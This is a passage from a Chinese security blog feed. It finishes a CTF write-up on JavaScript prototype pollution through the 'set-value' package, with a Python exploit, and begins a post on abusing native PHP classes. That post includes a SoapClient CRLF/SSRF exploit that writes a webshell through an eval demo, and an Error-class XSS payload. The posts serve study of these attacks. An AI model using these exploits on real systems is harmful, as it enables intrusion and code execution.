punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Why not ask witch for help?</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>knight <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/SpawnPoint'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeKey <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeValue <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"What's your problem?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> key <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeKey<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> value <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeValue<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">setFn</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>knight<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Let's have a check!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>审计代码，flag在环境变量中，需要访问<code>DeveloperControlPanel</code>这个路由，并且需要<code>Admin[key] === password</code>，简单来说我们需要知道p1、p2、p3中的任意一个密码即可拿到flag</p><p>根据提示看到<code>Privilege</code>路由，这里访问时<code>knight</code>这个<code>session</code>没定义，则重定向到<code>SpawnPoint</code>创建一个，随后再访问的时候需要携带<code>NewAttributeKey</code>和<code>NewAttributeValue</code>两个参数，来进行<code>setFn</code>操作，可以看到<code>setFn</code>在头部定义<code>const setFn = require(&#39;set-value&#39;);</code></p><ul><li><p><a href="https://www.npmjs.com/package/set-value">set-value</a> : Set nested properties on an object using dot notation. / 使用点表示法在对象上设置嵌套属性。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> set <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'set-value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">'a.b.c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//=> &#123; a: &#123; b: &#123; c: 'd' &#125; &#125; &#125;</span></code></pre></li></ul><p>跟进到这个包的源代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'use strict'</span><span class="token punctuation">;</span><span class="token keyword">const</span> isPlain <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'is-plain-object'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> path<span class="token punctuation">,</span> value<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isObject</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> target<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> opts <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> isArray <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isArray <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> path <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> target<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> merge <span class="token operator">=</span> opts<span class="token punctuation">.</span>merge<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>merge <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> merge <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    merge <span class="token operator">=</span> Object<span class="token punctuation">.</span>assign<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> keys <span class="token operator">=</span> isArray <span class="token operator">?</span> path <span class="token operator">:</span> <span class="token function">split</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> len <span class="token operator">=</span> keys<span class="token punctuation">.</span>length<span class="token punctuation">;</span>  <span class="token keyword">const</span> orig <span class="token operator">=</span> target<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>options <span class="token operator">&amp;&amp;</span> keys<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">result</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> keys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> merge<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> target<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> prop <span class="token operator">=</span> keys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isObject</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      target<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">result</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> prop<span class="token punctuation">,</span> value<span class="token punctuation">,</span> merge<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    target <span class="token operator">=</span> target<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> orig<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">result</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> path<span class="token punctuation">,</span> value<span class="token punctuation">,</span> merge</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>merge <span class="token operator">&amp;&amp;</span> <span class="token function">isPlain</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isPlain</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    target<span class="token punctuation">[</span>path<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> target<span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    target<span class="token punctuation">[</span>path<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>构造<code>NewAttributeKey</code>为<code>__proto__.extrader</code>，<code>NewAttributeValue</code>为<code>extrader</code></p><p><code>path</code>被拆分成<code>[&#39;__proto__&#39;,&#39;extrader&#39;]</code>，第一次的for循环，将<code>target = target[prop]</code>，此时的<code>prop</code>就是<code>__proto__</code>，经过一次循环后<code>target</code>就为<code>req.session.knight.__proto__</code>了，随后<code>i === len - 1</code>判断为最后一个值，进入<code>result</code></p><p>主要看到<code>result</code>这个方法，会将<code>value</code>赋值给<code>target[path]</code>,存在赋值操作,便出现了原型链污染  </p><p>传入<code>result</code>函数的<code>target</code>为<code>req.session.knight.__proto__</code>，<code>req.session.knight</code>的原型是<code>Object</code>，即<code>Object.prototype</code>，我们就可以在<code>Object</code>这个类中定义变量<code>req.session.knight.__proto__[path] = value</code>，即<code>Object.prototype[path] = value</code>，键为path，值为value，value和path我们都可控</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605181626037.png" alt loading="lazy"></p><p>Exp：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1:3000/'</span>data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"NewAttributeKey"</span> <span class="token punctuation">:</span> <span class="token string">"__proto__.extrader"</span><span class="token punctuation">,</span>    <span class="token string">"NewAttributeValue"</span> <span class="token punctuation">:</span> <span class="token string">"extrader"</span><span class="token punctuation">&#125;</span>data2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"key"</span> <span class="token punctuation">:</span> <span class="token string">"extrader"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span> <span class="token punctuation">:</span> <span class="token string">"extrader"</span><span class="token punctuation">&#125;</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'SpawnPoint'</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'Privilege'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'DeveloperControlPanel'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data2<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">继承与原型链</a></li><li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击</a></li><li><a href="https://xz.aliyun.com/t/7182">浅析javascript原型链污染攻击</a></li><li><a href="https://www.huaweicloud.com/articles/588bbccfd343112b66fba197a74dd245.html">JS中的prototype、__proto__与constructor</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学点新东西，JavaScript独有的安全问题，JavaScript原型链污染，记笔记&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="原型链" scheme="https://www.extrader.top/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE/"/>
    
      <category term="JavaScript" scheme="https://www.extrader.top/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>php原生类利用</title>
    <link href="https://www.extrader.top/posts/35c0085d/"/>
    <id>https://www.extrader.top/posts/35c0085d/</id>
    <published>2021-05-21T12:00:00.000Z</published>
    <updated>2021-05-21T15:35:44.717Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Class-Found"><a href="#Class-Found" class="headerlink" title="Class Found"></a>Class Found</h3><p><strong>php中含魔术方法的内置类</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 返回由已定义类的名字所组成的数组</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 返回由类的方法名组成的数组</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string single-quoted-string">'__destruct'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__toString'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__wakeup'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__call'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__callStatic'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__get'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__set'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__isset'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__unset'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__invoke'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__set_state'</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'::'</span> <span class="token operator">.</span> <span class="token variable">$method</span> <span class="token operator">.</span> <span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">print</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><h3 id="SoapClient-call"><a href="#SoapClient-call" class="headerlink" title="SoapClient::__call"></a>SoapClient::__call</h3><p>可进行SSRF</p><p><strong>range</strong>：<code>PHP 5, PHP 7, PHP 8</code></p><blockquote><p>SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。</p><p>其采用HTTP作为底层通讯协议，XML作为数据传送的格式，仅限于http/https协议</p><p>SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。</p><p>如果想要使用SoapClient类需要在php.ini配置文件里面开启extension=php_soap.dll选项</p></blockquote><pre class="language-php" data-language="php"><code class="language-php">SoapClient <span class="token punctuation">&#123;</span>    <span class="token comment">/* 方法 */</span>    <span class="token keyword">public</span> <span class="token function">__construct</span> <span class="token punctuation">(</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$wsdl</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token function">__call</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$args</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span>    <span class="token keyword">public</span> <span class="token function">__doRequest</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$request</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$location</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$action</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$version</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$oneWay</span> <span class="token operator">=</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getCookies</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span>    <span class="token keyword">public</span> <span class="token function">__getFunctions</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getLastRequest</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getLastRequestHeaders</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getLastResponse</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getLastResponseHeaders</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getTypes</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__setCookie</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">void</span>    <span class="token keyword">public</span> <span class="token function">__setLocation</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$location</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__setSoapHeaders</span> <span class="token punctuation">(</span> <span class="token class-name">SoapHeader</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">__soapCall</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$args</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">,</span> <span class="token class-name">SoapHeader</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$inputHeaders</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">array</span> <span class="token operator">&amp;</span><span class="token variable">$outputHeaders</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span><span class="token punctuation">&#125;</span></code></pre><p><strong>use</strong></p><ul><li><code>SoapClient::__construct ( string|null $wsdl , array $options = [] )</code><ul><li><code>$wsdl</code>：wsdl文件的uri，如果是NULL意味着不使用WSDL模式。</li><li><code>$options</code>：如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li></ul></li><li><code>SoapClient::__call ( string $name , array $args ) : mixed</code></li></ul><p>官方的<code>$option</code>参数中有这样的一条介绍</p><pre class="language-none"><code class="language-none">The user_agent option specifies string to use in User-Agent header.</code></pre><p>我们可以自己设置<code>User-Agent</code>的值。当我们可以控制User-Agent的值时，也就意味着我们完全可以构造一个POST请求，因为<code>Content-Type</code>和<code>Content-Length</code>都在<code>User-Agent</code>之下，而控制这两个是利用<code>CRLF</code>发送POST请求最关键的地方。</p><p><strong>Demo</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>Exp</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$target</span><span class="token operator">=</span> <span class="token string single-quoted-string">'http://127.0.0.1/demo.php'</span><span class="token punctuation">;</span><span class="token variable">$post_string</span><span class="token operator">=</span> <span class="token string single-quoted-string">'1=file_put_contents("shell.php", "&lt;?php phpinfo();?>");'</span><span class="token punctuation">;</span><span class="token variable">$headers</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>   <span class="token string single-quoted-string">'X-Forwarded-For:127.0.0.1'</span><span class="token punctuation">,</span>   <span class="token string single-quoted-string">'Cookie:admin=1'</span>   <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span><span class="token operator">=></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'user_agent'</span><span class="token operator">=></span><span class="token string single-quoted-string">'wupco^^Content-Type:application/x-www-form-urlencoded^^'</span><span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^Content-Length:'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^^^'</span><span class="token operator">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span><span class="token string double-quoted-string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//因为User-agent是可以控制的，因此可以利用crlf注入http头部发送post请求</span><span class="token variable">$aaa</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span><span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%0d%0a'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span><span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%26'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$aaa</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用__call方法触发网络请求发送</span><span class="token variable">$x</span><span class="token operator">-></span><span class="token function">no_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521214101395.png" alt loading="lazy"></p><p>成功写shell</p><h3 id="Error-Exception"><a href="#Error-Exception" class="headerlink" title="Error/Exception"></a>Error/Exception</h3><p>XSS</p><p><strong>range</strong>：<code>Error(php7, PHP8), Exception(php5, php7, PHP8)</code></p><p>通过内置<code>__toString()</code>魔术方法触发。</p><p><strong>Demo</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span></code></pre><p><strong>Error Class Exp</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">#注意版本是PHP7</span></span></code></pre><p><strong>Payload</strong></p><pre class="language-none"><code 